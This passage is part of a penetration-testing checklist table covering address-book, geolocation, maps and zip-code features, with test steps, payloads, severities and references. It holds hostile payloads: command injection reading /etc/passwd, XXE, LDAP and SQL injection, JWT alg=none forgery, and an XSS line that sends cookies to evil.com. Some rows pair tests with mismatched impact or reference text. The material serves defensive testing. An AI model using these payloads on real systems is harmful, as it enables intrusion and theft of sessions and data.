| ADDR-088 | Concurrent Access Race Condition | Business Logic (WSTG-BUSL-08) | Address Book Management | 1. Simultaneously send requests to add and delete the same address.<br>2. Send concurrent modification requests for the same address.<br>3. Check for data inconsistency. | Application must implement proper locking mechanisms to prevent data corruption from concurrent address book operations. | <code>Send concurrent POST /api/addresses (add) and DELETE /api/addresses/ADDR-1001 (delete)</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Turbo Intruder;Burp Suite | CWE-362; [Race Condition kit](#/checklist/racecondition); James Kettle Smashing the State Machine |
| ADDR-089 | Address Book Pagination Authorization Bypass | Broken Access Control (WSTG-AUTHZ-04) | Address Book Management | 1. Access address book with pagination.<br>2. Modify page_size to a very large number.<br>3. Check if addresses from other users leak through pagination abuse. | Application must ensure pagination only returns the authenticated user's addresses regardless of page size. | <code>GET /api/address-book?page=1&amp;page_size=999999 to check for cross-user data leakage</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADDR-090 | GraphQL Over-Fetching on Address Book | Injection (WSTG-INPV-01) | Address Book Management | 1. If GraphQL is used query the address book with nested queries requesting excessive fields.<br>2. Request fields like user details or payment info through address relationships.<br>3. Check for data exposure. | Application must implement field-level authorization and query depth limiting in GraphQL to prevent over-fetching. | <code>{addressBook{addresses{id;street;user{id;email;password;paymentMethods{cardNumber;cvv}}}}}</code> | GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;InQL;GraphQL Voyager | CWE-400; [IDOR kit](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger |
| ADDR-091 | Address Book Deletion Without Confirmation | Business Logic (WSTG-BUSL-02) | Address Book Management | 1. Send a delete all addresses request or bulk delete request without any confirmation.<br>2. Check if all addresses are deleted in one request without requiring confirmation. | Application must require explicit confirmation for bulk operations and implement undo or soft-delete functionality. | <code>DELETE /api/address-book/clear or POST /api/address-book/bulk-delete with all address IDs</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADDR-092 | JWT Manipulation on Address Book Endpoint | Authentication (WSTG-ATHN-01) | Address Book Management | 1. Decode the JWT token.<br>2. Modify the user_id or sub claim.<br>3. Change the algorithm to none.<br>4. Submit request to address book endpoint with tampered token. | Application must validate JWT signatures server-side and reject tokens with modified claims or algorithm downgrade. | <code>Modify JWT header alg=none and payload sub=admin;change user_id in payload to another user</code> | JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;jwt_tool | CWE-347; [JWT kit](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT |
| ADDR-093 | Sensitive Data Exposure in Address Book API Response | Information Disclosure (WSTG-INFO-05) | Address Book Management | 1. Fetch address book data via API.<br>2. Inspect the response for sensitive or unnecessary fields.<br>3. Check for internal IDs or metadata or creation timestamps. | Application must return only necessary fields in address book responses and strip internal metadata. | <code>Check response for fields like created_by_admin;internal_note;db_row_id;last_modified_by;ip_address</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADDR-094 | Address Book CORS Misconfiguration | Security Misconfiguration (WSTG-CONF-07) | Address Book Management | 1. Send address book API request from a different origin.<br>2. Check the CORS headers in the response.<br>3. Test if wildcard or overly permissive origins are allowed. | Application must implement strict CORS policies allowing only trusted origins to access address book APIs. | <code>Check for Access-Control-Allow-Origin: &#42; or reflection of arbitrary Origin header in response</code> | CORS misconfiguration -&gt; credentialed cross-origin secret theft -&gt; account takeover. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Browser;cURL | CWE-942; [CORS kit](#/checklist/cors); PortSwigger CORS; Christian Schneider |
| ADDR-095 | LDAP Injection in Address Fields | Injection (WSTG-INPV-06) | Add / Edit / Delete Address | 1. If address lookup integrates with LDAP directory inject LDAP payloads in address fields.<br>2. Observe the response for LDAP errors or bypass. | Application must sanitize all inputs used in LDAP queries and use parameterized LDAP operations. | <code>street=&#42;)(cn=admin)(&#124;;city=test)(&#124;(uid=&#42;))(cn=&#42;;name=admin)(&amp;</code> | LDAP filter injection -&gt; authentication bypass / directory data disclosure. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Custom Scripts | CWE-90; [LDAP kit](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings |
| ADDR-096 | Command Injection via Address Processing | Injection (WSTG-INPV-12) | Add / Edit / Delete Address | 1. If addresses are processed by server-side commands for label generation or geocoding inject OS command payloads.<br>2. Check for command execution. | Application must never pass user-provided address input directly to OS commands and use safe APIs. | <code>street=123 Main St;cat /etc/passwd;city=Test&#96;whoami&#96;;state=NY&#124;id</code> | OS command injection -&gt; remote code execution / server takeover. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Commix | CWE-78; [Command Injection kit](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins |
| ADDR-097 | XXE in Address Import XML | Injection (WSTG-INPV-07) | Add / Edit / Delete Address | 1. If address import accepts XML format inject XXE payload in the XML.<br>2. Submit and check if external entities are resolved. | Application must disable external entity processing in all XML parsers used for address data. | <code>&lt;?xml version='1.0'?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;address&gt;&lt;street&gt;&amp;xxe;&lt;/street&gt;&lt;/address&gt;</code> | XXE -&gt; local file read / SSRF / OOB exfiltration. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;OWASP ZAP | CWE-611; [XXE kit](#/checklist/xxe); PortSwigger XXE |
| ADDR-098 | Insecure Deserialization in Address Data | Injection (WSTG-INPV-08) | Add / Edit / Delete Address | 1. If address data is serialized check for insecure deserialization.<br>2. Inject malicious serialized objects in address fields.<br>3. Submit and observe for RCE. | Application must avoid deserializing untrusted input and validate all deserialized address data. | <code>Inject serialized Java/PHP/Python object in address parameters or cookies</code> | Insecure deserialization -&gt; remote code execution. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;ysoserial | CWE-502; [Deserialization kit](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial |
| ADDR-099 | Default Address Information Leakage in Error Messages | Information Disclosure (WSTG-ERRH-01) | Default Address Selection | 1. Attempt to set an invalid or non-existent address as default.<br>2. Observe error messages for verbose information about the address system or database structure. | Application must return generic error messages without exposing internal details about address storage or validation logic. | <code>PUT /api/addresses/set-default with address_id=INVALID-999 and check for verbose database error messages</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADDR-100 | Mass Assignment on Default Address Flag | Mass Assignment (WSTG-INPV-01) | Default Address Selection | 1. When editing an address add is_default=true as an additional parameter.<br>2. Check if the address becomes default without using the proper set-default endpoint. | Application must only process default address changes through the dedicated endpoint and ignore is_default in edit requests. | <code>Add is_default=true to PUT /api/addresses/ADDR-1001 edit request body</code> | Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-915; [IDOR kit](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA |
| ADDR-101 | Validation Logic Bypass via Null Bytes | Input Validation (WSTG-INPV-01) | Address Validation | 1. Insert null bytes in address fields before validation.<br>2. Check if null bytes truncate input causing validation to pass on truncated valid-looking address.<br>3. Verify what is stored. | Application must reject null bytes in address input and validate the complete untruncated input. | <code>street=123 Main St%00&lt;script&gt;alert(1)&lt;/script&gt;;zip=10001%00' OR 1=1--</code> | Improper input validation -&gt; downstream injection / logic abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ADDR-102 | Address Validation API Key Exposure | Information Disclosure (WSTG-INFO-05) | Address Validation | 1. If address validation uses a third-party API check for API key exposure in client-side code.<br>2. Test if the key can be abused for unauthorized validation requests. | Application must proxy validation requests through its own server and not expose third-party API keys to the client. | <code>Search JavaScript files for validation API keys like SmartyStreets;Loqate;Google validation API keys</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Browser DevTools;GitLeaks | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADDR-103 | Geolocation Precision Abuse for Tracking | Privacy (WSTG-INFO-05) | Geolocation / Auto-detect | 1. Check the precision of geolocation data collected.<br>2. Verify if high-precision GPS data is stored when only city-level precision is needed.<br>3. Check data access controls. | Application must collect only the minimum necessary geolocation precision and implement strict access controls on location data. | <code>Check if coordinates with 6+ decimal places (sub-meter precision) are stored when only city-level is needed</code> | Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Manual Database Review | CWE-359; [IDOR kit](#/checklist/idor); OWASP Privacy Risks; GDPR |
| ADDR-104 | Geolocation Fallback Security | Business Logic (WSTG-BUSL-01) | Geolocation / Auto-detect | 1. Block geolocation API in browser.<br>2. Check what fallback mechanism the application uses.<br>3. Test if the fallback like IP geolocation can be manipulated via X-Forwarded-For. | Application must validate fallback location data and not blindly trust IP-based geolocation or client-provided fallback values. | <code>Block navigator.geolocation then add X-Forwarded-For: IP-of-different-country to manipulate IP geolocation fallback</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser DevTools | CWE-840; PortSwigger Business logic |
| ADDR-105 | Google Maps API Billing Abuse | Security Misconfiguration (WSTG-CONF-01) | Google Maps Integration | 1. Extract Google Maps API key.<br>2. Check if billing alerts and quotas are set.<br>3. Make excessive API calls to exhaust the key owner's quota and generate billing charges. | Application must set strict usage quotas and billing alerts on Google Maps API keys and restrict key usage to specific APIs. | <code>Use extracted API key to make 100000+ Directions API calls generating billing charges for the key owner</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | cURL;Custom Scripts;KeyHacks | CWE-16; OWASP Security Misconfiguration (A05) |
| ADDR-106 | Autocomplete Endpoint Abuse | Business Logic (WSTG-BUSL-05) | Google Maps Integration | 1. Access the Google Maps Places Autocomplete proxy endpoint.<br>2. Send rapid requests to abuse the autocomplete service.<br>3. Check for rate limiting. | Application must rate-limit autocomplete requests and implement abuse detection to prevent excessive third-party API usage. | <code>Send 1000+ GET /api/maps/autocomplete?input=a requests per minute</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;Custom Scripts | CWE-840; PortSwigger Business logic |
| ADDR-107 | Zone Configuration Exposure via Error Messages | Information Disclosure (WSTG-ERRH-01) | Delivery Zone Validation | 1. Submit boundary or edge-case addresses to zone validation.<br>2. Observe error messages for zone configuration details.<br>3. Check if zone boundaries or internal zone IDs are exposed. | Application must return generic zone validation responses without exposing internal zone configuration or boundary data. | <code>Submit address exactly on zone boundary and check error for zone_boundary_lat;zone_boundary_lng;zone_config details</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADDR-108 | Zone Validation TOCTOU Race Condition | Business Logic (WSTG-BUSL-08) | Delivery Zone Validation | 1. Validate address in a serviceable zone.<br>2. Quickly change address to non-serviceable zone before order submission.<br>3. Check if the stale validation is used. | Application must re-validate the delivery zone at the time of order submission not just during initial address entry. | <code>Validate address in zone A then rapidly change to zone B address and submit order before re-validation</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Turbo Intruder | CWE-362; [Race Condition kit](#/checklist/racecondition); James Kettle Smashing the State Machine |
| ADDR-109 | Zip Code Lookup Reflected XSS | Cross-Site Scripting (WSTG-INPV-01) | Pin Code / Zip Code Lookup | 1. Enter XSS payload in the zip code search field.<br>2. Submit the lookup.<br>3. Check if the input is reflected in the response without encoding. | Application must encode all user inputs reflected in zip code lookup responses. | <code>GET /api/zipcode/lookup?code="&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;code=&lt;img/src=x onerror=alert(document.cookie)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADDR-110 | Server-Side Zip Code Lookup Response Manipulation | Business Logic (WSTG-BUSL-01) | Pin Code / Zip Code Lookup | 1. Perform zip code lookup.<br>2. Intercept the response.<br>3. Modify the returned city or state or delivery availability.<br>4. Forward and check if the application trusts the modified response. | Application must validate zip code data server-side and not rely on client-received lookup responses for critical decisions. | <code>Intercept and change {"city":"Restricted City";"deliverable":false} to {"city":"Open City";"deliverable":true}</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ADDR-111 | Smuggling Attacks via Address Character Sets | Injection (WSTG-INPV-01) | International Address Support | 1. Submit addresses using mixed character encodings.<br>2. Include characters that have different interpretations in different encodings.<br>3. Check for parser confusion. | Application must normalize all character encodings to UTF-8 before processing and validate after normalization. | <code>Mix UTF-8 and Latin-1 characters; use overlong UTF-8 sequences like %c0%af for / or %c0%ae for .</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADDR-112 | International Postal Code Format Exploitation | Input Validation (WSTG-INPV-01) | International Address Support | 1. Test postal code validation with formats from different countries.<br>2. Use valid formats from one country in another country's context.<br>3. Check for validation bypass. | Application must validate postal code format based on the selected country and reject mismatched formats. | <code>Use UK postal code SW1A 1AA for US address;use alphanumeric Canadian code K1A 0B1 for numeric-only zip field</code> | Improper input validation -&gt; downstream injection / logic abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ADDR-113 | Address Book Backup and Restore Manipulation | Business Logic (WSTG-BUSL-02) | Address Book Management | 1. If address book backup and restore exists create a backup.<br>2. Modify the backup file to include injected addresses or altered data.<br>3. Restore the modified backup. | Application must validate and sanitize all data during backup restore and verify backup file integrity. | <code>Modify exported backup JSON/CSV to add malicious addresses or change existing address details then restore</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Manual Testing | CWE-840; PortSwigger Business logic |
| ADDR-114 | Cross-Tenant Address Book Access | Broken Access Control (WSTG-AUTHZ-04) | Address Book Management | 1. In a multi-tenant application attempt to access address books of users in different tenants.<br>2. Modify tenant_id or organization_id.<br>3. Check for cross-tenant data leakage. | Application must enforce strict tenant isolation and prevent any cross-tenant access to address book data. | <code>Change GET /api/tenant/T001/address-book to /api/tenant/T002/address-book with T001 credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADDR-115 | Address Book API Versioning Bypass | Broken Access Control (WSTG-AUTHZ-02) | Address Book Management | 1. Try accessing address book via older API versions.<br>2. Check if deprecated endpoints lack authorization.<br>3. Test /api/v1/address-book vs /api/v2/address-book. | Application must enforce consistent authorization across all API versions including deprecated ones. | <code>GET /api/v1/addresses (may lack auth);GET /api/v0/address-book;GET /api/internal/addresses</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;DirBuster | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADDR-116 | Address Update Race Condition for Order Redirect | Business Logic (WSTG-BUSL-08) | Add / Edit / Delete Address | 1. Place an order.<br>2. Immediately after order placement rapidly update the shipping address via a concurrent request.<br>3. Check if the order ships to the updated address. | Application must lock the shipping address at order confirmation time and not allow modification through address book updates. | <code>Concurrent POST /api/orders (place order) and PUT /api/addresses/ADDR-1001 (change address)</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Turbo Intruder;Burp Suite | CWE-362; [Race Condition kit](#/checklist/racecondition); James Kettle Smashing the State Machine |
| ADDR-117 | Soft Delete Bypass on Addresses | Broken Access Control (WSTG-AUTHZ-02) | Add / Edit / Delete Address | 1. Delete an address.<br>2. Try accessing the deleted address via direct API call with the old address_id.<br>3. Check if soft-deleted addresses are still accessible. | Application must properly enforce soft-delete by hiding deleted addresses from all API responses including direct access. | <code>GET /api/addresses/ADDR-DELETED-1001 after deletion to check if data is still returned</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADDR-118 | Batch Address Operations Authorization | Broken Access Control (WSTG-AUTHZ-04) | Add / Edit / Delete Address | 1. If batch address operations exist (bulk add/edit/delete) include address_ids from other users in the batch.<br>2. Submit and check if cross-user operations succeed. | Application must validate ownership of every address in batch operations individually. | <code>POST /api/addresses/bulk-delete with address_ids=[ADDR-1001;ADDR-2001;ADDR-3001] including other users addresses</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADDR-119 | Location History Privacy Violation | Privacy (WSTG-INFO-05) | Geolocation / Auto-detect | 1. Use auto-detect location multiple times.<br>2. Check if a location history is maintained.<br>3. Verify if location history is accessible to unauthorized users or persisted unnecessarily. | Application must not maintain unnecessary location history and must provide users control over their location data. | <code>Check for /api/users/location-history endpoint or location data in user profile API response</code> | Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-359; [IDOR kit](#/checklist/idor); OWASP Privacy Risks; GDPR |
| ADDR-120 | Map Tile Request Manipulation | Input Validation (WSTG-INPV-01) | Google Maps Integration | 1. Intercept map tile requests.<br>2. Modify tile coordinates or zoom levels to extreme values.<br>3. Check for error messages or server-side resource exhaustion. | Application must validate map tile request parameters within acceptable ranges and handle invalid requests gracefully. | <code>Modify tile x=999999&amp;y=999999&amp;z=99 in map tile request to cause server errors</code> | Improper input validation -&gt; downstream injection / logic abuse. | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser DevTools | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ADDR-121 | Stored XSS via Custom Map Markers | Cross-Site Scripting (WSTG-INPV-02) | Google Maps Integration | 1. If users can add custom markers or labels on maps inject XSS in marker title or description.<br>2. Save and view the map.<br>3. Check if payload executes when others view the map. | Application must sanitize all user-provided map annotation data before rendering on the map. | <code>marker_title=&lt;script&gt;alert(document.cookie)&lt;/script&gt;;marker_desc=&lt;img src=x onerror=fetch('https://evil.com/'+document.cookie)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADDR-122 | Boundary Testing on Delivery Zones | Business Logic (WSTG-BUSL-01) | Delivery Zone Validation | 1. Test addresses on exact boundaries of delivery zones.<br>2. Submit coordinates that are exactly on the zone boundary line.<br>3. Check for inconsistent zone assignment. | Application must handle boundary addresses consistently and assign zones deterministically. | <code>Submit coordinates on exact zone boundary lines to check for inconsistent is_deliverable responses</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADDR-123 | Zip Code Lookup HTTP Parameter Pollution | Input Validation (WSTG-INPV-04) | Pin Code / Zip Code Lookup | 1. Send zip code lookup with duplicate parameters.<br>2. Provide different values for the same parameter.<br>3. Check which value the server processes. | Application must handle duplicate parameters consistently and reject ambiguous requests. | <code>GET /api/zipcode?code=10001&amp;code=99999 or GET /api/zipcode?code=10001&amp;code=' OR 1=1--</code> | Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-915; [IDOR kit](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA |
| ADDR-124 | Address Normalization Bypass | Input Validation (WSTG-INPV-01) | International Address Support | 1. Submit addresses with different representations of the same location.<br>2. Use abbreviations vs full names and different formatting.<br>3. Check for duplicate address creation or validation bypass. | Application must normalize addresses before comparison and validation to prevent duplicate entries and validation bypasses. | <code>Submit 123 Main Street vs 123 Main St vs 123 main street and check if treated as duplicates</code> | Improper input validation -&gt; downstream injection / logic abuse. | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ADDR-125 | Address Book Size Limit Bypass | Business Logic (WSTG-BUSL-05) | Address Book Management | 1. Check maximum address book size.<br>2. Bypass frontend limit by directly calling the API to add more addresses than allowed.<br>3. Check server-side enforcement. | Application must enforce address book size limits server-side not just on the client side. | <code>POST /api/addresses repeatedly after reaching UI-displayed limit of 10 addresses</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-840; PortSwigger Business logic |
| ADDR-126 | Sensitive Address Data in URL Parameters | Information Disclosure (WSTG-INFO-05) | Address Book Management | 1. Check if address data is passed via URL parameters rather than request body.<br>2. Verify if sensitive address details appear in browser history or server logs. | Application must send sensitive address data in request body not URL parameters and use POST for address operations. | <code>Check for GET /api/addresses?street=123+Secret+St&amp;city=Hidden+City in browser history and access logs</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Browser DevTools;Burp Suite | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADDR-127 | Address Modification During Active Order | Business Logic (WSTG-BUSL-02) | Add / Edit / Delete Address | 1. Place an order with a specific address.<br>2. While order is processing modify the shipping address.<br>3. Check if the active order's shipping address changes. | Application must snapshot the shipping address at order time and not allow modifications to affect orders already in processing. | <code>Modify address ADDR-1001 while order using ADDR-1001 is in status=processing and check if order address changes</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADDR-128 | Address Validation State Confusion | Business Logic (WSTG-BUSL-02) | Add / Edit / Delete Address | 1. Add an address that passes validation.<br>2. Edit the address to an invalid address.<br>3. Check if the is_validated flag remains true despite the edit. | Application must re-validate addresses whenever they are modified and clear validation status on any edit. | <code>Edit validated address changing street to invalid value and check if is_validated stays true</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADDR-129 | Geolocation Consent Cookie Manipulation | Session Management (WSTG-SESS-01) | Geolocation / Auto-detect | 1. Check if geolocation consent is stored in a cookie.<br>2. Modify the consent cookie to bypass consent requirements.<br>3. Check if location is auto-detected without proper consent. | Application must verify geolocation consent server-side and not rely solely on client-side cookie values. | <code>Change cookie location_consent=denied to location_consent=granted</code> | Session fixation/hijack -&gt; attacker rides the victim's authenticated session. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser DevTools | CWE-384; [Account Takeover kit](#/checklist/ato); PortSwigger Session management |
| ADDR-130 | Maps SDK Version Vulnerability | Security Misconfiguration (WSTG-CONF-01) | Google Maps Integration | 1. Identify the Google Maps SDK version used.<br>2. Check for known vulnerabilities in that version.<br>3. Verify if the SDK is up to date. | Application must use the latest stable version of Google Maps SDK and patch known vulnerabilities promptly. | <code>Check script src for maps.googleapis.com/maps/api/js?v=3.XX and lookup CVEs for that version</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Browser DevTools;CVE databases | CWE-16; OWASP Security Misconfiguration (A05) |
| ADDR-131 | Zone Validation Timing Side-Channel | Information Disclosure (WSTG-INFO-01) | Delivery Zone Validation | 1. Send zone validation requests for various zip codes.<br>2. Measure response times precisely.<br>3. Determine if timing differences reveal zone configuration or coverage areas. | Application must ensure constant-time responses for zone validation to prevent timing-based zone enumeration. | <code>Measure response times for 100 different zip codes looking for timing patterns that reveal zone boundaries</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADDR-132 | Pin Code Lookup Verbose Error Messages | Information Disclosure (WSTG-ERRH-01) | Pin Code / Zip Code Lookup | 1. Submit malformed pin codes to the lookup endpoint.<br>2. Send extremely long values or special characters.<br>3. Check error messages for stack traces or database details. | Application must return generic user-friendly error messages without exposing technical details. | <code>zip_code='; check for stack traces;database names;table structures;internal paths in error response</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
